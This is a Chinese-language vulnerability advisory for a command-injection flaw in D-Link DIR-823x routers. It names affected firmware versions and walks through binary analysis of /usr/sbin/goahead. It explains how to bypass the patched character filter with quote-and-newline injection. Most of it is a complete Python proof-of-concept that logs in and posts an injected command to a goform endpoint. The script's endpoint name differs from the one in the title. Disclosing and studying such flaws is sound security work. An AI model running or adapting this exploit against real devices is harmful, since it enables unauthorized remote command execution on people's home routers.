# DIink-DIR-823x/goform/set_server_settings命令执行漏洞

漏洞厂商：友讯科技股份有限公司

厂商官网：https://www.dlink.cn 

影响对象类型：网络设备

影响产品：Dlink-DIR-823x

影响产品版本：DIR-823x 250416，240802，240126

是否产品组件漏洞：否

## **一、漏洞概述**

**D-Link DIR-8****23x** 是D-Link公司推出的一款无线路由器产品。

D-Link DIR-823x 存在命令执行漏洞，该漏洞源于文件 /usr/sbin/goahead 在处理环境变量时未对输入参数进行充分校验，攻击者可利用该漏洞构造恶意请求，在系统上执行任意命令。

## 二、**漏洞详情**

路由器固件下载：[D-Link | 家庭网络](https://www.dlink.com.cn/home/product?id=3118)

ida分析二进制文件/usr/sbin/goahead,定位set_server_settings，手动恢复一下符号表，程序首先接收了三个参数，sys_cmd就是危险函数所在

 ![image-20250908170636713](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908170636713.png)

首先是一个检测，但检测不完整，只检测了"()'{};`"这七个字符串，这里240802，240126两个版本是没有任何检测的，所以直接存在命令注入，笔者分析的是250416，这里是有补丁的，我们需要绕过一下，利用引号拼接和\n进行注入\"\n{cmd}\n\，这样攻击这就可以绕过这个检测

 

 ![image-20250908200557880](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908200557880.png)

后续的sub_412E7C就会把字符串直接赋值给system去执行，这里就存在命令注入了，此处part存在注入

![img](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/wps5.jpg) 

 

 POC

```
import requests
import logging
import argparse
import re
import hmac
import hashlib


logging.basicConfig(level=logging.DEBUG)


def extract_cookies_from_response(response):
    cookies = response.headers.get('Set-Cookie', '')
    sessionid = re.search(r'sessionid=([^;]+)', cookies)
    token = re.search(r'token=([^;]+)', cookies)
    sessionid = sessionid.group(1) if sessionid else None
    token = token.group(1) if token else None
    return sessionid, token

def send_get_login_page(session, host_ip):
    url = f"http://{host_ip}/login.html"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    response = session.get(url, headers=headers)
    
    if response.status_code == 200:
        sessionid, token = extract_cookies_from_response(response)
        return sessionid, token
    else:
        logging.error("Failed to get login page.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")
        return None, None

def hash_password(password, token):
    hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
    url = f"http://{host_ip}/goform/login"
    
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "username": username,
        "password": hashed_password,
        "token": token
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    return response

def send_diag_traceroute_request(session, host_ip, sessionid, token):
    url = f"http://{host_ip}/goform/set_switch_settings"
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "port": "\"\nls\n\"",
        "token": token
    }
    

    response = session.post(url, headers=headers, data=payload)
    
    return response

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.1.1', help='Host IP address.')
    parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')

    args = parser.parse_args()

    logging.info(f'Host IP: {args.host}')

    # Get login page
    sessionid, token = send_get_login_page(session, args.host)
    if sessionid and token:
        logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
        
        # Hash the password
        hashed_password = hash_password(args.password, token)
        
        # Send login request
        response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
        if response.status_code == 200:
            logging.info("Login request sent successfully.")
            logging.debug(f"Response: {response.text}")
            
            # Extract updated sessionid and token from login response
            sessionid, token = extract_cookies_from_response(response)
            
            # Send LAN settings request
            response = send_diag_traceroute_request(session, args.host, sessionid, token)
            if response.status_code == 200:
                logging.info("LAN settings request sent successfully.")
                logging.debug(f"Response: {response.text}")
            else:
                logging.error("Failed to send LAN settings request.")
                logging.error(f"Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        else:
            logging.error("Failed to send login request.")
            logging.error(f"Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    else:
        logging.error("Failed to retrieve sessionid and token from login page.")

if __name__ == "__main__":
    main()
```

成功执行

![image-20250908201409241](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908201409241.png)



 

## **三、漏洞影响**

1. 攻击者可利用此漏洞远程命令执行
2. 攻击者可利用此漏洞RCE

## **四、修复方案**

1. 联系相关厂商，获取安全补丁，及时进行漏洞修复
2. 联系相关安全厂商，及时更新安全阻断策略
3. 临时对接口参数进行安全检查

‍